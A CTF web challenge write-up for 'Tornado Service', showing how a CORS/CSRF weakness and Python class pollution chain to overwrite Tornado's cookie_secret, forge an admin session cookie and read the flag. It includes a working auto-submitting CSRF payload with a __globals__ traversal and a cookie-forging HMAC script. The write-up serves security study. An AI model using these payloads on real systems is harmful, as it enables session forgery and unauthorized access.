# Tornado Service - CTF Web Challenge Writeup

## Challenge Overview

**Challenge Name:** Tornado Service  
**Category:** Web  
**Difficulty:** Medium

The challenge involves exploiting a Tornado web application that manages tornado monitoring machines. The application has two critical vulnerabilities that can be chained together to achieve remote code execution and retrieve the flag.

---

## Vulnerabilities

### 1. CORS Misconfiguration (CSRF Attack)

The application has overly permissive CORS settings that allow Cross-Site Request Forgery (CSRF) attacks:

```python
def set_default_headers(self):
    self.set_header("Access-Control-Allow-Origin", "*")
    self.set_header("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS")
    self.set_header("Access-Control-Allow-Headers", "Content-Type, Authorization, x-requested-with")
```

**Impact:** This configuration allows any external website to make authenticated requests to the application, including POST requests with JSON data using `Content-Type: text/plain`.

### 2. Class Pollution (Prototype Pollution but in python)

The `update_tornados()` function in `/update_tornado` endpoint is vulnerable to class pollution:

```python
def update_tornados(tornado, updated):
    for index, value in tornado.items():
        if hasattr(updated, "__getitem__"):
            if updated.get(index) and type(value) == dict:
                update_tornados(value, updated.get(index))
            else:
                updated[index] = value
        elif hasattr(updated, index) and type(value) == dict:
            update_tornados(value, getattr(updated, index))
        else:
            setattr(updated, index, value)
```

**Issue:** The function recursively sets attributes on Python objects without proper validation. An attacker can traverse the Python object hierarchy using special attributes like `__init__`, `__class__`, `__globals__`, etc.

**Target:** The goal is to overwrite the `cookie_secret` variable used by Tornado to sign session cookies. Once we control this secret, we can forge valid admin cookies.

---

## Exploitation Steps

### Step 1: Flag location

The `/update_tornado` endpoint is protected and only accepts requests from localhost:

```python
def post(self):
    if not is_request_from_localhost(self):
        self.set_status(403)
        self.write(json_response("Only localhost can update tornado status.", "Forbidden", error=True))
        return
```

**Bypass:** We use CSRF to make the admin bot trigger the request from localhost.

### Step 2: Report Tornado - Trigger Bot

The application has a `/report_tornado?ip=` endpoint that triggers a headless browser (bot) to visit a URL:

```python
def get(self):
    ip_param = self.get_argument("ip", None)
    tornado_url = f"http://{ip_param}/agent_details"
    if ip_param and is_valid_url(tornado_url):
        bot_thread(tornado_url)
```

We can use this to make the bot visit our malicious server hosting the CSRF exploit.

### Step 3: CSRF Payload for Class Pollution

Create an HTML page that automatically submits a CSRF form to `/update_tornado`:

```html
<!DOCTYPE html>
<html>
  <body>
    <form action="http://127.0.0.1:1337/update_tornado" method="POST" enctype="text/plain">
      <input type="hidden" name='{"machine_id":"test","__class__":{"__init__":{"__globals__":{"__loader__":{"__init__":{"__globals__":{"sys":{"modules":{"__main__":{"APP":{"settings":{"cookie_secret":"test2xd","yo":"' value='"}}}}}}}}}}}}'/>
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Payload Explanation:**

The JSON payload traverses the Python object hierarchy:
```
machine_id (valid machine) 
  → __class__ (class object)
    → __init__ (constructor method)
      → __globals__ (global namespace)
        → __loader__ (module loader)
          → __init__.__globals__ (loader's globals)
            → sys.modules (loaded modules)
              → __main__ (main module)
                → APP (application instance)
                  → settings.cookie_secret = "test2xd"
```

This path allows us to reach the `APP` object from the `TornadoObject` instance and overwrite the `cookie_secret`.

### Step 4: Host the Exploit

1. Set up a web server hosting the malicious HTML:
   ```bash
   python3 -m http.server 80
   ```

2. Trigger the bot to visit your server:
   ```
   http://target/report_tornado?ip=YOUR_IP/admin.html
   ```

### Step 5: Forge valid Cookie

After successfully polluting the `cookie_secret`, we can forge a valid session cookie.

**Cookie Format:** Tornado uses the format:
```
version|timestamp|key|value|signature
```

Example cookie creation script:

```python
import hmac
import hashlib

# The secret we set via class pollution
cookie_secret = "test2xd"

# Cookie payload (username in base64)
payload = "2|1:0|10:1762324432|4:user|36:eGNsb3czbkB0b3JuYWRvLXNlcnZpY2UuaHRi|"

# Calculate HMAC-SHA256 signature
signature = hmac.new(
    key=cookie_secret.encode("utf-8"),
    msg=payload.encode("utf-8"),
    digestmod=hashlib.sha256
).hexdigest()

# Final cookie value
print(payload + signature)
```

The base64 encoded username is for: `xclow3n@tornado-service.htb` (a valid admin user).

### Step 6: Access Protected Endpoint

With the forged cookie, we can now access `/stats` endpoint that requires authentication:

```python
class ProtectedContentHandler(BaseHandler):
    def get_current_user(self):
        return self.get_secure_cookie("user")

    def get(self):
        if not self.current_user:
            self.set_status(401)
            return
        
        flag = read_file_contents("/flag.txt")
        self.write(json_response(flag, "Success"))
```

**Request:**
```http
GET /stats HTTP/1.1
Host: target
Cookie: user=2|1:0|10:1762324432|4:user|36:eGNsb3czbkB0b3JuYWRvLXNlcnZpY2UuaHRi|[signature]
```

**Response:**
```json
{
  "success": {
    "type": "Success",
    "message": "HTB{FLAG_HERE}"
  }
}
```

---


## References

- [Tornado Web Framework Security](https://www.tornadoweb.org/en/stable/guide/security.html)
- [Python Class Pollution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md)
- [CSRF Attacks](https://owasp.org/www-community/attacks/csrf)
